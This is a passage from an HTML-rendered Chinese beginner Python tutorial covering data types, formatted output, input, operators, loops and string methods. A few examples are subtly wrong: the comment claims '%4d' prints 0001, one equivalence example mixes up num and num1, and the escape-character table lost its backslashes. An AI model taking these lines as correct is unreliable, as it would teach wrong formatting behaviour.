class="comment"># &lt;class &#x27;bool&#x27;&gt; -- 布尔型</span></span><br><span class="line"></span><br><span class="line">d = <span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(d)) <span class="comment"># &lt;class &#x27;str&#x27;&gt; -- 字符串</span></span><br><span class="line"></span><br><span class="line">e = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(e)) <span class="comment"># &lt;class &#x27;list&#x27;&gt; -- 列表</span></span><br><span class="line"></span><br><span class="line">f = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(f)) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; -- 元组</span></span><br><span class="line"></span><br><span class="line">h = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(h)) <span class="comment"># &lt;class &#x27;set&#x27;&gt; -- 集合</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a)) <span class="comment"># &lt;class &#x27;int&#x27;&gt; -- 整型</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">1.1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b)) <span class="comment"># &lt;class &#x27;float&#x27;&gt; -- 浮点型</span></span><br><span class="line"></span><br><span class="line">c = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c)) <span class="comment"># &lt;class &#x27;bool&#x27;&gt; -- 布尔型</span></span><br><span class="line"></span><br><span class="line">d = <span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(d)) <span class="comment"># &lt;class &#x27;str&#x27;&gt; -- 字符串</span></span><br><span class="line"></span><br><span class="line">e = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(e)) <span class="comment"># &lt;class &#x27;list&#x27;&gt; -- 列表</span></span><br><span class="line"></span><br><span class="line">f = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(f)) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; -- 元组</span></span><br><span class="line"></span><br><span class="line">h = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(h)) <span class="comment"># &lt;class &#x27;set&#x27;&gt; -- 集合</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="3-输入输出"><a href="#3-输入输出" class="headerlink" title="3. 输入输出"></a>3. 输入输出</h1><h2 id="3-1-输出"><a href="#3-1-输出" class="headerlink" title="3.1 输出"></a>3.1 输出</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello Python&#x27;</span>)</span><br><span class="line">age = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(age)</span><br></pre></td></tr></table></figure>
<h3 id="3-1-1-格式化输出"><a href="#3-1-1-格式化输出" class="headerlink" title="3.1.1 格式化输出"></a>3.1.1 格式化输出</h3><table>
<thead>
<tr>
<th>格式符号</th>
<th>转换</th>
</tr>
</thead>
<tbody><tr>
<td>%s</td>
<td>字符串</td>
</tr>
<tr>
<td>%d</td>
<td>有符号的⼗进制整数</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数</td>
</tr>
<tr>
<td>%c</td>
<td>字符</td>
</tr>
<tr>
<td>%u</td>
<td>⽆符号⼗进制整数</td>
</tr>
<tr>
<td>%o</td>
<td>⼋进制整数</td>
</tr>
<tr>
<td>%x</td>
<td>⼗六进制整数（⼩写ox）</td>
</tr>
<tr>
<td>%X</td>
<td>⼗六进制整数（⼤写OX）</td>
</tr>
<tr>
<td>%e</td>
<td>科学计数法（⼩写’e’）</td>
</tr>
<tr>
<td>%E</td>
<td>科学计数法（⼤写’E’）</td>
</tr>
<tr>
<td>%g</td>
<td>%f和%e的简写</td>
</tr>
<tr>
<td>%G</td>
<td>%f和%E的简写</td>
</tr>
</tbody></table>
<ul>
<li>%06d，表示输出的整数显示位数，不⾜以0补全，超出当前位数则原样输出</li>
<li>%.2f，表示⼩数点后显示的⼩数位数。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">name = <span class="string">&#x27;TOM&#x27;</span></span><br><span class="line">weight = <span class="number">75.5</span></span><br><span class="line">student_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s&#x27;</span> % name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的学号是0001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的学号是%4d&#x27;</span> % student_id)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的体重是75.50公⽄</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的体重是%.2f公⽄&#x27;</span> % weight)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM，今年18岁了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s，今年%d岁了&#x27;</span> % (name, age))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM，明年19岁了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s，明年%d岁了&#x27;</span> % (name, age + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM，明年19岁了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;我的名字是<span class="subst">&#123;name&#125;</span>, 明年<span class="subst">&#123;age + <span class="number">1</span>&#125;</span>岁了&#x27;</span>)</span><br><span class="line"><span class="comment"># f-格式化字符串是Python3.6中新增的格式化⽅法，该⽅法更简单易读。</span></span><br></pre></td></tr></table></figure>

<h3 id="3-1-2-转义字符"><a href="#3-1-2-转义字符" class="headerlink" title="3.1.2 转义字符"></a>3.1.2 转义字符</h3><p>转义字符在书写形式上由多个字符组成，但 Python 将它们看作是一个整体，表示一个字符。<br>| 转义字符 | 说明 |<br>| — | — |<br>| \n | 换行符，将光标位置移到下一行开头。 |<br>| \r | 回车符，将光标位置移到本行开头。 |<br>| \t | 水平制表符，也即 Tab 键，一般相当于四个空格。 |<br>| \a | 蜂鸣器响铃。注意不是喇叭发声，现在的计算机很多都不带蜂鸣器了，所以响铃不一定有效。 |<br>| \b | 退格（Backspace），将光标位置移到前一列。 |<br>| \ | 反斜线 |<br>| &#39; | 单引号 |<br>| &quot; | 双引号 |<br>| \    | 在字符串行尾的续行符，即一行未完，转到下一行继续写。 |</p>
<h3 id="3-1-3-结束符"><a href="#3-1-3-结束符" class="headerlink" title="3.1.3 结束符"></a>3.1.3 结束符</h3><p>在Python中，print()， 默认⾃带 end=”\n” 这个换⾏结束符，可以按需求更改结束符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;内容&#x27;</span>, end=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="3-2-输入"><a href="#3-2-输入" class="headerlink" title="3.2 输入"></a>3.2 输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_message = <span class="built_in">input</span>(<span class="string">&quot;提示信息:&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="3-2-1-特点"><a href="#3-2-1-特点" class="headerlink" title="3.2.1 特点"></a>3.2.1 特点</h3><ul>
<li>当程序执⾏到 input ，等待⽤户输⼊，输⼊完成之后才继续向下执⾏。</li>
<li>⼀般将input接收的数据存储到变量，⽅便使⽤。</li>
<li>input接收的任何数据默认都是<strong>字符串</strong>类型<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">password = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您的密码：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的密码是<span class="subst">&#123;password&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(password)) <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="4-转换数据类型和运算符"><a href="#4-转换数据类型和运算符" class="headerlink" title="4. 转换数据类型和运算符"></a>4. 转换数据类型和运算符</h1><h2 id="4-1-转换数据类型的函数"><a href="#4-1-转换数据类型的函数" class="headerlink" title="4.1 转换数据类型的函数"></a>4.1 转换数据类型的函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>int(x [,base ])</td>
<td>将x转换为⼀个整数</td>
</tr>
<tr>
<td>float(x )</td>
<td>将x转换为⼀个浮点数</td>
</tr>
<tr>
<td>complex(real [,imag ])</td>
<td>创建⼀个复数，real为实部，imag为虚部</td>
</tr>
<tr>
<td>str(x )</td>
<td>将对象 x 转换为字符串</td>
</tr>
<tr>
<td>repr(x )</td>
<td>将对象 x 转换为表达式字符串</td>
</tr>
<tr>
<td>eval(str )</td>
<td>⽤来计算在字符串中的有效Python表达式,并返回⼀个对象</td>
</tr>
<tr>
<td>tuple(s )</td>
<td>将序列 s 转换为⼀个元组</td>
</tr>
<tr>
<td>list(s )</td>
<td>将序列 s 转换为⼀个列表</td>
</tr>
<tr>
<td>chr(x )</td>
<td>将⼀个整数转换为⼀个Unicode字符</td>
</tr>
<tr>
<td>ord(x )</td>
<td>将⼀个字符转换为它的ASCII整数值</td>
</tr>
<tr>
<td>hex(x )</td>
<td>将⼀个整数转换为⼀个⼗六进制字符串</td>
</tr>
<tr>
<td>oct(x )</td>
<td>将⼀个整数转换为⼀个⼋进制字符串</td>
</tr>
<tr>
<td>bin(x )</td>
<td>将⼀个整数转换为⼀个⼆进制字符串</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. float() -- 转换成浮点型</span></span><br><span class="line">num1 = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(num1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">float</span>(num1)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. str() -- 转换成字符串类型</span></span><br><span class="line">num2 = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">str</span>(num2)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. tuple() -- 将⼀个序列转换成元组</span></span><br><span class="line">list1 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(list1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">tuple</span>(list1)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. list() -- 将⼀个序列转换成列表</span></span><br><span class="line">t1 = (<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(t1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">list</span>(t1)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. eval() -- 将字符串中的数据转换成Python表达式原本类型</span></span><br><span class="line">str1 = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;[1, 2, 3]&#x27;</span></span><br><span class="line">str3 = <span class="string">&#x27;(1000, 2000, 3000)&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">eval</span>(str1)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">eval</span>(str2)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">eval</span>(str3)))</span><br></pre></td></tr></table></figure>

<h2 id="4-2-运算符"><a href="#4-2-运算符" class="headerlink" title="4.2 运算符"></a>4.2 运算符</h2><h3 id="4-2-1-算数运算符"><a href="#4-2-1-算数运算符" class="headerlink" title="4.2.1 算数运算符"></a>4.2.1 算数运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加</td>
<td>1 + 1 输出结果为 2</td>
</tr>
<tr>
<td>-</td>
<td>减</td>
<td>1-1 输出结果为 0</td>
</tr>
<tr>
<td>*</td>
<td>乘</td>
<td>2 * 2 输出结果为 4</td>
</tr>
<tr>
<td>/</td>
<td>除</td>
<td>10 / 2 输出结果为 5</td>
</tr>
<tr>
<td>//</td>
<td>整除</td>
<td>9 // 4 输出结果为2</td>
</tr>
<tr>
<td>%</td>
<td>取余</td>
<td>9 % 4 输出结果为 1</td>
</tr>
<tr>
<td>**</td>
<td>指数</td>
<td>2 ** 4 输出结果为 16，即 2 * 2 * 2 * 2</td>
</tr>
<tr>
<td>()</td>
<td>⼩括号</td>
<td>⼩括号⽤来提⾼运算优先级，即 (1 + 2) * 3 输出结果为 9</td>
</tr>
<tr>
<td>优先级顺序： () ⾼于 ** ⾼于 * / // % ⾼于 + -</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="4-2-2-赋值运算符"><a href="#4-2-2-赋值运算符" class="headerlink" title="4.2.2 赋值运算符"></a>4.2.2 赋值运算符</h3><ul>
<li>单个变量赋值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li>多个变量赋值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1, float1, str1 = <span class="number">10</span>, <span class="number">0.5</span>, <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">num = <span class="number">10</span> </span><br><span class="line">float1 = <span class="number">0.5</span></span><br><span class="line">str1 = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line">a = b = <span class="number">10</span> <span class="comment"># 多变量赋相同值</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-2-3-复合赋值运算符"><a href="#4-2-3-复合赋值运算符" class="headerlink" title="4.2.3  复合赋值运算符"></a>4.2.3  复合赋值运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+=</td>
<td>加法赋值运算符</td>
<td>c += a 等价于 c = c + a</td>
</tr>
<tr>
<td>-=</td>
<td>减法赋值运算符</td>
<td>c -= a 等价于 c = c- a</td>
</tr>
<tr>
<td>*=</td>
<td>乘法赋值运算符</td>
<td>c *= a 等价于 c = c * a</td>
</tr>
<tr>
<td>/=</td>
<td>除法赋值运算符</td>
<td>c /= a 等价于 c = c / a</td>
</tr>
<tr>
<td>//=</td>
<td>整除赋值运算符</td>
<td>c //= a 等价于 c = c // a</td>
</tr>
<tr>
<td>%=</td>
<td>取余赋值运算符</td>
<td>c %= a 等价于 c = c % a</td>
</tr>
<tr>
<td>**=</td>
<td>幂赋值运算符</td>
<td>c ** = a 等价于 c = c ** a</td>
</tr>
</tbody></table>
<h3 id="4-2-4-比较运算符"><a href="#4-2-4-比较运算符" class="headerlink" title="4.2.4 比较运算符"></a>4.2.4 比较运算符</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">7</span></span><br><span class="line">b = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(a == b) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a != b) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(a &lt; b) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a &gt; b) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(a &lt;= b) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a &gt;= b) <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2-5-逻辑运算符"><a href="#4-2-5-逻辑运算符" class="headerlink" title="4.2.5 逻辑运算符"></a>4.2.5 逻辑运算符</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与</span></span><br><span class="line"><span class="built_in">print</span>((a &lt; b) <span class="keyword">and</span> (b &lt; c)) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>((a &gt; b) <span class="keyword">and</span> (b &lt; c)) <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">print</span>((a &gt; b) <span class="keyword">or</span> (b &lt; c)) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 非</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> (a &gt; b)) <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<h1 id="5-条件语句"><a href="#5-条件语句" class="headerlink" title="5. 条件语句"></a>5. 条件语句</h1><h2 id="5-1-语法"><a href="#5-1-语法" class="headerlink" title="5.1 语法"></a>5.1 语法</h2><ul>
<li><p>if 语句语法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    条件成⽴执⾏的代码</span><br></pre></td></tr></table></figure></li>
<li><p>if…else…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    条件成⽴执⾏的代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    条件不成⽴执⾏的代码</span><br></pre></td></tr></table></figure></li>
<li><p>多重判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    条件<span class="number">1</span>成⽴执⾏的代码</span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    条件<span class="number">2</span>成⽴执⾏的代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    以上条件都不成⽴执⾏的代码</span><br></pre></td></tr></table></figure></li>
<li><p>if嵌套</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    条件<span class="number">1</span>成⽴执⾏的代码</span><br><span class="line">    <span class="keyword">if</span> 条件<span class="number">2</span>:</span><br><span class="line">        条件<span class="number">2</span>成⽴执⾏的代码</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5-2-三元运算符"><a href="#5-2-三元运算符" class="headerlink" title="5.2 三元运算符"></a>5.2 三元运算符</h2><p>语法</p>
<blockquote>
<p>条件成⽴执⾏的表达式 if 条件 else 条件不成⽴执⾏的表达式</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> b</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<h1 id="6-循环"><a href="#6-循环" class="headerlink" title="6. 循环"></a>6. 循环</h1><h2 id="6-1-while-循环"><a href="#6-1-while-循环" class="headerlink" title="6.1 while 循环"></a>6.1 while 循环</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">100</span>:</span><br><span class="line">    result += i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="comment"># 输出5050</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="6-2-for-循环"><a href="#6-2-for-循环" class="headerlink" title="6.2 for 循环"></a>6.2 for 循环</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;12345678&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<h2 id="6-3-break-continue-else"><a href="#6-3-break-continue-else" class="headerlink" title="6.3 break, continue, else"></a>6.3 break, continue, else</h2><ul>
<li>break：直接退出循环</li>
<li>continue：跳过当前轮循环continue后代码，直接进行下一轮（计数器+1）</li>
<li>else<ul>
<li>while和for都可以配合else使⽤</li>
<li>else下⽅缩进的代码含义：当循环正常结束后执⾏的代码</li>
<li><strong>break终⽌循环不会执⾏else下⽅缩进的代码</strong></li>
<li><strong>continue退出循环的⽅式执⾏else下⽅缩进的代码</strong></li>
</ul>
</li>
</ul>
<h1 id="7-字符串"><a href="#7-字符串" class="headerlink" title="7. 字符串"></a>7. 字符串</h1><h2 id="7-1-认识字符串"><a href="#7-1-认识字符串" class="headerlink" title="7.1 认识字符串"></a>7.1 认识字符串</h2><h3 id="7-1-1-语法"><a href="#7-1-1-语法" class="headerlink" title="7.1.1 语法"></a>7.1.1 语法</h3><p>⼀般使⽤引号来创建字符串。</p>
<ul>
<li>一对引号字符串<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">b = <span class="string">&quot;abcdefg&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>三引号字符串<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name3 = <span class="string">&#x27;&#x27;&#x27; Tom &#x27;&#x27;&#x27;</span></span><br><span class="line">name4 = <span class="string">&quot;&quot;&quot; Rose &quot;&quot;&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27; i am Tom,</span></span><br><span class="line"><span class="string">    nice to meet you! &#x27;&#x27;&#x27;</span></span><br><span class="line">b = <span class="string">&quot;&quot;&quot; i am Rose,</span></span><br><span class="line"><span class="string">    nice to meet you! &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>特殊字符的使用<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&quot;I&#x27;m Tom&quot;</span></span><br><span class="line">d = <span class="string">&#x27;I\&#x27;m Tom&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="7-1-2-字符串输出"><a href="#7-1-2-字符串输出" class="headerlink" title="7.1.2 字符串输出"></a>7.1.2 字符串输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">name = <span class="string">&#x27;Tom&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s&#x27;</span> % name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;我的名字是<span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="7-1-3-字符串输入"><a href="#7-1-3-字符串输入" class="headerlink" title="7.1.3 字符串输入"></a>7.1.3 字符串输入</h3>在Python中，使⽤ input() 接收⽤户输⼊。默认接收为字符串类型。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您的名字：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的名字是<span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(name))</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您的密码：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的密码是<span class="subst">&#123;password&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(password))</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="7-2-下标"><a href="#7-2-下标" class="headerlink" title="7.2 下标"></a>7.2 下标</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">1</span>]) <span class="comment"># b</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>]) <span class="comment"># a</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>]) <span class="comment"># c</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>下标从 0 开始</p>
</blockquote>
<h2 id="7-3-切片"><a href="#7-3-切片" class="headerlink" title="7.3 切片"></a>7.3 切片</h2><p>切⽚是指对操作的对象截取其中⼀部分的操作。<strong>字符串、列表、元组都⽀持切⽚操作</strong>。</p>
<h3 id="7-3-1-语法"><a href="#7-3-1-语法" class="headerlink" title="7.3.1 语法"></a>7.3.1 语法</h3><blockquote>
<p>序列[开始位置下标:结束位置下标:步⻓]</p>
<ul>
<li>不包含结束位置下标对应的数据， 正负整数均可；（左闭右开[)）</li>
<li>步⻓是选取间隔，正负整数均可，默认步⻓为1。</li>
</ul>
</blockquote>
<h3 id="7-3-2-演示"><a href="#7-3-2-演示" class="headerlink" title="7.3.2 演示"></a>7.3.2 演示</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;abcdefg&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>:<span class="number">5</span>:<span class="number">1</span>]) <span class="comment"># cde</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>:<span class="number">5</span>]) <span class="comment"># cde</span></span><br><span class="line"><span class="built_in">print</span>(name[:<span class="number">5</span>]) <span class="comment"># abcde</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">1</span>:]) <span class="comment"># bcdefg</span></span><br><span class="line"><span class="built_in">print</span>(name[:]) <span class="comment"># abcdefg</span></span><br><span class="line"><span class="built_in">print</span>(name[::<span class="number">2</span>]) <span class="comment"># aceg</span></span><br><span class="line"><span class="built_in">print</span>(name[:-<span class="number">1</span>]) <span class="comment"># abcdef, 负1表示倒数第⼀个数据</span></span><br><span class="line"><span class="built_in">print</span>(name[-<span class="number">4</span>:-<span class="number">1</span>]) <span class="comment"># def</span></span><br><span class="line"><span class="built_in">print</span>(name[::-<span class="number">1</span>]) <span class="comment"># gfedcba</span></span><br></pre></td></tr></table></figure>

<h2 id="7-4-常用⽅法"><a href="#7-4-常用⽅法" class="headerlink" title="7.4 常用⽅法"></a>7.4 常用⽅法</h2><h3 id="7-4-1-查找"><a href="#7-4-1-查找" class="headerlink" title="7.4.1 查找"></a>7.4.1 查找</h3><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>find()</td>
<td>字符串序列.find(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检测某个⼦串是否包含在这个字符串中，如果在返回这个⼦串开始的位置下标，否则则返回-1。</td>
</tr>
<tr>
<td>index()</td>
<td>字符串序列.index(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检测某个⼦串是否包含在这个字符串中，如果在返回这个⼦串开始的位置下标，否则则报异常。</td>
</tr>
<tr>
<td>rfind()</td>
<td></td>
<td>和find()功能相同，但查找⽅向为右侧开始。</td>
</tr>
<tr>
<td>rindex()</td>
<td></td>
<td>和index()功能相同，但查找⽅向为右侧开始。</td>
</tr>
<tr>
<td>count()</td>
<td>字符串序列.count(⼦串, 开始位置下标, 结束位置下标)</td>
<td>返回某个⼦串在字符串中出现的次数</td>
</tr>
</tbody></table>
<h3 id="7-4-2-修改"><a href="#7-4-2-修改" class="headerlink" title="7.4.2 修改"></a>7.4.2 修改</h3><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>replace()</td>
<td>字符串序列.replace(旧⼦串, 新⼦串, 替换次数)</td>
<td>替换</td>
</tr>
<tr>
<td>split()</td>
<td>字符串序列.split(分割字符, num)</td>
<td>按照指定字符分割字符串。num，替换次数</td>
</tr>
<tr>
<td>join()</td>
<td>字符或⼦串.join(多字符串组成的序列)</td>
<td>⽤⼀个字符或⼦串合并字符串，即是将多个字符串合并为⼀个新的字符串。</td>
</tr>
<tr>
<td>capitalize()</td>
<td>mystr.capitalize()</td>
<td>将字符串第⼀个字符转换成⼤写。</td>
</tr>
<tr>
<td>title()</td>
<td>mystr.title()</td>
<td>将字符串每个单词⾸字⺟转换成⼤写。</td>
</tr>
<tr>
<td>lower()</td>
<td>mystr.lower()</td>
<td>将字符串中⼤写转⼩写。</td>
</tr>
<tr>
<td>upper()</td>
<td>mystr.upper()</td>
<td>将字符串中⼩写转⼤写。</td>
</tr>
<tr>
<td>lstrip()</td>
<td>mystr.lstrip()</td>
<td>删除字符串左侧空⽩字符。</td>
</tr>
<tr>
<td>rstrip()</td>
<td>mystr.rstrip()</td>
<td>删除字符串右侧空⽩字符。</td>
</tr>
<tr>
<td>strip()</td>
<td>mystr.strip()</td>
<td>删除字符串两侧空⽩字符。</td>
</tr>
<tr>
<td>ljust()</td>
<td>mystr.ljust()</td>
<td>返回⼀个原字符串左对⻬,并使⽤指定字符(默认空格)填充⾄对应⻓度的新字符串。</td>
</tr>
</tbody></table>
<blockquote>
<p>注意：</p>
<ul>
